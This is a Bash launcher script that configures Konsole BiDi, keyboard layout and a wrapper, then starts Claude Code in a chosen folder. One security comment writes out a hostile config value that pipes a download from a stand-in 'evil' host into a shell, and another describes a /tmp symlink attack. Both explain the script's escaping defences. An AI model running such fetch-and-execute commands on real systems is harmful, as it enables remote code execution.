#!/bin/bash
# Kivun Terminal — Linux launcher
# Reads ~/.config/kivun-terminal/config.txt, applies keyboard layout and
# BiDi settings, then spawns Konsole with the KivunTerminal profile running
# Claude Code in the chosen folder.
#
# Usage:
#   kivun-terminal                    # launches in $HOME (or folder picker)
#   kivun-terminal /path/to/folder    # launches in the given folder

set -u

LOG_FILE="${KIVUN_LOG:-$HOME/.local/share/kivun-terminal/launch.log}"
mkdir -p "$(dirname "$LOG_FILE")" 2>/dev/null || true

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }

log "=== Kivun Terminal launcher ==="
log "User: $USER | Display: ${DISPLAY:-<none>} | Wayland: ${WAYLAND_DISPLAY:-<none>}"

# --- Load config ---
CONFIG_FILE="$HOME/.config/kivun-terminal/config.txt"
RESPONSE_LANGUAGE="english"
TEXT_DIRECTION="rtl"
TERMINAL_COLOR="kivun"
KEYBOARD_TOGGLE="true"
FOLDER_PICKER="false"
CLAUDE_FLAGS=""
KIVUN_BIDI_WRAPPER="on"
trim() {
    # Pure-bash whitespace trim. Avoids `xargs` which both strips quotes
    # and globs unquoted special characters against the CWD (so a config
    # value of `*` or `?` would expand to the file list).
    local s="$1"
    s="${s#"${s%%[![:space:]]*}"}"
    s="${s%"${s##*[![:space:]]}"}"
    printf '%s' "$s"
}
if [ -f "$CONFIG_FILE" ]; then
    # `|| [[ -n "$key" ]]` handles a missing trailing newline: without
    # it, a config file that doesn't end in \n drops its last key=value.
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        [[ "$key" =~ ^[[:space:]]*# ]] && continue
        [[ -z "$key" ]] && continue
        key=$(trim "$key")
        value=$(trim "$value")
        case "$key" in
            RESPONSE_LANGUAGE)   RESPONSE_LANGUAGE="$value" ;;
            TEXT_DIRECTION)      TEXT_DIRECTION="$value" ;;
            TERMINAL_COLOR)      TERMINAL_COLOR="$value" ;;
            KEYBOARD_TOGGLE)     KEYBOARD_TOGGLE="$value" ;;
            FOLDER_PICKER)       FOLDER_PICKER="$value" ;;
            CLAUDE_FLAGS)        CLAUDE_FLAGS="$value" ;;
            KIVUN_BIDI_WRAPPER)  KIVUN_BIDI_WRAPPER="$value" ;;
        esac
    done < "$CONFIG_FILE"
fi
log "Config: lang=$RESPONSE_LANGUAGE dir=$TEXT_DIRECTION color=$TERMINAL_COLOR kb=$KEYBOARD_TOGGLE picker=$FOLDER_PICKER bidi=$KIVUN_BIDI_WRAPPER"

# Decide which binary the tmp launch script will invoke. Wrapper is
# default-on in v1.1.0. Resolution order:
#   1. Bundled wrapper at ~/.local/share/kivun-terminal/kivun-claude-bidi/
#      (deployed by install.sh; npm install runs at install time, or here
#      on first launch if install skipped it because node was missing).
#   2. Anything called `kivun-claude-bidi` on PATH (manual installs).
#   3. Unwrapped `claude` with a loud WARNING.
ensure_wrapper_installed() {
    # Returns 0 and echoes the wrapper binary path if usable; non-zero on failure.
    local dst="$HOME/.local/share/kivun-terminal/kivun-claude-bidi"
    local bin="$dst/bin/kivun-claude-bidi"
    [ -d "$dst" ] || return 1

    chmod +x "$bin" 2>/dev/null || true

    # npm install guard — same stamp pattern as the WSL launcher. Reinstall
    # only if node_modules is missing or package.json is newer than the stamp.
    local stamp="$dst/node_modules/.kivun-install-stamp"
    if [ ! -f "$stamp" ] || [ "$dst/package.json" -nt "$stamp" ]; then
        if command -v npm >/dev/null 2>&1; then
            log "Installing wrapper deps (one-time, ~5-15s) — npm install --production"
            (cd "$dst" && npm install --production --no-audit --no-fund) >> "$LOG_FILE" 2>&1
            local rc=$?
            if [ $rc -ne 0 ]; then
                log "ERROR: npm install failed (rc=$rc); see $LOG_FILE"
                return 1
            fi
            mkdir -p "$(dirname "$stamp")"
            touch "$stamp"
        else
            log "ERROR: npm not on PATH; cannot install wrapper deps. Install Node.js + npm and relaunch."
            return 1
        fi
    fi

    [ -x "$bin" ] || return 1
    printf '%s' "$bin"
    return 0
}

CLAUDE_EXEC="claude"
if [ "$KIVUN_BIDI_WRAPPER" = "on" ]; then
    if WRAPPER_BIN=$(ensure_wrapper_installed); then
        CLAUDE_EXEC="$WRAPPER_BIN"
        log "BiDi wrapper active: $CLAUDE_EXEC"
    elif command -v kivun-claude-bidi >/dev/null 2>&1; then
        CLAUDE_EXEC="kivun-claude-bidi"
        log "BiDi wrapper active (PATH fallback): kivun-claude-bidi"
    else
        log "WARNING: KIVUN_BIDI_WRAPPER=on but wrapper unavailable; using unwrapped claude"
    fi
fi

# --- Resolve target folder ---
TARGET_DIR=""
if [ $# -ge 1 ] && [ -n "${1:-}" ]; then
    TARGET_DIR="$1"
elif [ "$FOLDER_PICKER" = "true" ]; then
    # Pick the native helper for the current DE. On KDE, kdialog is
    # already installed and doesn't pull GTK; on GNOME/Xfce/etc, zenity
    # is the portable choice. If both are present, honor the DE hint.
    PREFER_KDIALOG=""
    [[ "${XDG_CURRENT_DESKTOP:-}" =~ (KDE|Plasma) ]] && PREFER_KDIALOG=1
    if [ -n "$PREFER_KDIALOG" ] && command -v kdialog >/dev/null 2>&1; then
        TARGET_DIR=$(kdialog --getexistingdirectory "$HOME" \
            --title "Select folder to open with Kivun Terminal" 2>/dev/null)
    elif command -v zenity >/dev/null 2>&1; then
        TARGET_DIR=$(zenity --file-selection --directory \
            --title="Select folder to open with Kivun Terminal" 2>/dev/null)
    elif command -v kdialog >/dev/null 2>&1; then
        TARGET_DIR=$(kdialog --getexistingdirectory "$HOME" \
            --title "Select folder to open with Kivun Terminal" 2>/dev/null)
    fi
fi
[ -z "$TARGET_DIR" ] && TARGET_DIR="$HOME"
[ ! -d "$TARGET_DIR" ] && TARGET_DIR="$HOME"
log "Target folder: $TARGET_DIR"

# --- Refresh Konsole profile + color scheme ---
# Redeploy on every launch so config changes (BiDi on/off) take effect even
# if the user edited config.txt without reinstalling.
KONSOLE_DIR="$HOME/.local/share/konsole"
mkdir -p "$KONSOLE_DIR"

if [ "$TEXT_DIRECTION" = "rtl" ]; then
    BIDI_ENABLED="true"
    BIDI_LINE_LTR="false"
else
    BIDI_ENABLED="false"
    BIDI_LINE_LTR="true"
fi

USE_KIVUN_COLORS="ColorScheme=ColorSchemeNoam"
if [ "$TERMINAL_COLOR" != "kivun" ]; then
    USE_KIVUN_COLORS="# ColorScheme not set — using Konsole default"
fi

cat > "$KONSOLE_DIR/KivunTerminal.profile" <<PROF
[Appearance]
$USE_KIVUN_COLORS
Font=DejaVu Sans Mono,11,-1,5,50,0,0,0,0,0

[Cursor Options]
CursorShape=0
CustomCursorColor=0,80,200
UseCustomCursorColor=true

[General]
Name=Kivun Terminal
Parent=FALLBACK/
LocalTabTitleFormat=Kivun Terminal
RemoteTabTitleFormat=Kivun Terminal

[Scrolling]
HistorySize=10000
ScrollBarPosition=1

[Terminal Features]
BlinkingCursorEnabled=true
BidiEnabled=$BIDI_ENABLED
BidiLineLTR=$BIDI_LINE_LTR
PROF
log "Konsole profile refreshed (BiDi=$BIDI_ENABLED)"

# --- Keyboard layout toggle (X11 only — setxkbmap doesn't work on Wayland) ---
if [ "$KEYBOARD_TOGGLE" = "true" ] && [ -n "${DISPLAY:-}" ] && command -v setxkbmap >/dev/null 2>&1; then
    case "$RESPONSE_LANGUAGE" in
        english)     KBD_PRIMARY="us" ;;
        hebrew)      KBD_PRIMARY="il" ;;
        arabic)      KBD_PRIMARY="ara" ;;
        persian)     KBD_PRIMARY="ir" ;;
        urdu)        KBD_PRIMARY="pk" ;;
        kurdish)     KBD_PRIMARY="iq" ;;
        pashto)      KBD_PRIMARY="af" ;;
        sindhi)      KBD_PRIMARY="pk" ;;
        yiddish)     KBD_PRIMARY="il" ;;
        syriac)      KBD_PRIMARY="sy" ;;
        dhivehi)     KBD_PRIMARY="il" ;;
        nko)         KBD_PRIMARY="ml" ;;
        adlam)       KBD_PRIMARY="ml" ;;
        mandaic)     KBD_PRIMARY="il" ;;
        samaritan)   KBD_PRIMARY="il" ;;
        dari)        KBD_PRIMARY="af" ;;
        uyghur)      KBD_PRIMARY="cn" ;;
        balochi)     KBD_PRIMARY="pk" ;;
        kashmiri)    KBD_PRIMARY="in" ;;
        shahmukhi)   KBD_PRIMARY="pk" ;;
        azeri-south) KBD_PRIMARY="ir" ;;
        jawi)        KBD_PRIMARY="my" ;;
        turoyo)      KBD_PRIMARY="sy" ;;
        *)           KBD_PRIMARY="il" ;;
    esac
    setxkbmap -layout "${KBD_PRIMARY},us" -option "" -option grp:alt_shift_toggle 2>/dev/null \
        && log "Keyboard: ${KBD_PRIMARY},us with Alt+Shift toggle" \
        || log "Keyboard: setxkbmap failed (likely Wayland)"
fi

# --- Build language prompt for Claude ---
# Shared map lives at ~/.local/share/kivun-terminal/languages.sh — one
# source of truth across Linux + macOS. If sourcing fails (deleted file,
# older install), fall through with LANG_PROMPT="" and Claude runs in
# English — no user-visible crash.
LANG_PROMPT=""
LANG_MAP="$HOME/.local/share/kivun-terminal/languages.sh"
if [ -f "$LANG_MAP" ]; then
    # shellcheck disable=SC1090
    . "$LANG_MAP"
    LANG_PROMPT=$(kivun_lang_prompt "$RESPONSE_LANGUAGE")
fi

# Note: we intentionally do NOT kill the user's existing Konsole windows.
# On Linux (unlike WSL where each launch is a fresh container), the user
# may have real Konsole sessions open that we'd kill as a side effect.

# --- Build inner script that Konsole will execute ---
# Use $HOME/.cache (user-owned, 0700 perms) instead of /tmp. Tmpdir-based
# paths are world-writable with sticky bit: a malicious local user could
# pre-create /tmp/kivun-claude-launch-<UID>.sh as a symlink to ~/.bashrc
# and have us clobber it via `cat >`. ~/.cache has no such exposure.
CACHE_DIR="${XDG_CACHE_HOME:-$HOME/.cache}/kivun-terminal"
mkdir -p "$CACHE_DIR" 2>/dev/null || true
chmod 700 "$CACHE_DIR" 2>/dev/null || true
LAUNCH_TMP="$CACHE_DIR/claude-launch.sh"
rm -f "$LAUNCH_TMP" 2>/dev/null || true

KT_SETTINGS="$HOME/.local/share/kivun-terminal/settings.json"

# SECURITY (#2): write config-derived values to a separate env file that
# the tmp launcher sources. The tmp script itself is built with a QUOTED
# heredoc so nothing from the parent's environment is interpolated into
# the script body. Without this, a malicious config like
#   CLAUDE_FLAGS=$(curl evil|sh)
# would bake `$(curl evil|sh)` as literal text into the tmp script, then
# bash would evaluate it when the script ran — full RCE on every launch.
# With printf %q'd values in a sourced env file, CLAUDE_FLAGS becomes a
# string value; bash's parameter expansion of a variable does NOT re-run
# command substitution on that value.
ENV_FILE="$CACHE_DIR/launch-env.sh"
{
    printf 'KT_SETTINGS=%q\n'   "$KT_SETTINGS"
    printf 'LANG_PROMPT=%q\n'   "$LANG_PROMPT"
    printf 'CLAUDE_FLAGS=%q\n'  "$CLAUDE_FLAGS"
    printf 'CLAUDE_EXEC=%q\n'   "$CLAUDE_EXEC"
} > "$ENV_FILE"
chmod 600 "$ENV_FILE"

cat > "$LAUNCH_TMP" <<'LAUNCHEOF'
#!/bin/bash -l
echo "==============================================="
echo " Kivun Terminal — starting Claude Code"
echo "==============================================="
echo ""

# Load config-derived values written by the parent launcher. Each value
# was printf %q'd so any shell metacharacters are backslash-escaped; the
# assignment restores them as literal strings (no command substitution).
ENV_FILE="${XDG_CACHE_HOME:-$HOME/.cache}/kivun-terminal/launch-env.sh"
if [ -f "$ENV_FILE" ]; then
    . "$ENV_FILE"
fi
: "${KT_SETTINGS:=}"
: "${LANG_PROMPT:=}"
: "${CLAUDE_FLAGS:=}"
: "${CLAUDE_EXEC:=claude}"

# `command -v` resolves both PATH lookups (`claude`) and absolute paths
# (the wrapper binary). For absolute paths, `command -v` succeeds only if
# the file is executable — so handle that case explicitly to give a
# wrapper-specific error rather than the generic "install claude" message.
case "$CLAUDE_EXEC" in
    /*)
        if [ ! -x "$CLAUDE_EXEC" ]; then
            echo "ERROR: BiDi wrapper not executable at: $CLAUDE_EXEC"
            echo ""
            echo "Try (one of):"
            echo "  chmod +x \"$CLAUDE_EXEC\""
            echo "  rm -rf \"$(dirname "$(dirname "$CLAUDE_EXEC")")\" && re-run linux/install.sh"
            echo "  set KIVUN_BIDI_WRAPPER=off in ~/.config/kivun-terminal/config.txt"
            echo ""
            echo "Press Enter to close."
            read -r
            exit 1
        fi
        ;;
    *)
        if ! command -v "$CLAUDE_EXEC" >/dev/null 2>&1; then
            echo "ERROR: '$CLAUDE_EXEC' not found in PATH."
            echo "PATH: $PATH"
            echo ""
            echo "Install it with:"
            echo "  curl -fsSL https://claude.ai/install.sh -o /tmp/c.sh && bash /tmp/c.sh"
            echo ""
            echo "Press Enter to close."
            read -r
            exit 1
        fi
        ;;
esac

echo "Claude:  $CLAUDE_EXEC"
echo "Folder:  $(pwd)"
echo ""

# Build claude args as an array so paths with spaces (e.g. a HOME with a
# space in it) don't get word-split. $CLAUDE_FLAGS stays unquoted on the
# command line for multi-flag strings like "--continue --verbose". Because
# the variable was restored from a printf %q'd assignment, bash parameter
# expansion produces its value as LITERAL TEXT — any $(...) or backticks
# inside CLAUDE_FLAGS remain literal and are passed as-is to claude, not
# re-evaluated by the shell.
ARGS=()
[ -f "$KT_SETTINGS" ] && ARGS+=(--settings "$KT_SETTINGS")
[ -n "$LANG_PROMPT" ] && ARGS+=(--append-system-prompt "$LANG_PROMPT")

"$CLAUDE_EXEC" "${ARGS[@]}" $CLAUDE_FLAGS
EXIT_CODE=$?

echo ""
echo "==============================================="
echo " Claude exited with code $EXIT_CODE"
echo "==============================================="
echo "Press Enter to close."
read -r
LAUNCHEOF
chmod +x "$LAUNCH_TMP"

# --- Launch Konsole ---
cd "$TARGET_DIR" || cd "$HOME"
log "Launching: konsole --profile KivunTerminal --workdir $TARGET_DIR -e $LAUNCH_TMP"
exec konsole --profile KivunTerminal --workdir "$TARGET_DIR" -e "$LAUNCH_TMP"
